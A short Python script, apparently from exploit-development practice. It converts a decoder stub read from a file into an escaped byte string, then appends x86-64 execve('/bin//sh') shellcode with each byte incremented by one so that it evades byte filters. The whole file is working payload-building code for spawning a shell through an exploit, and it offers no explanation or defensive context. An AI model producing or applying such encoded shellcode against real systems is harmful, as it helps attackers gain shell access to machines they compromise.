payload = ''

with open('decode', 'rb') as decoder:
    p = decoder.read()
    for i in list(p):
        payload += "\\x%02x" % (i)

print(payload)

p = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

for i in list(p):
    payload += "\\x%02x" % (i + 1)

print(payload)
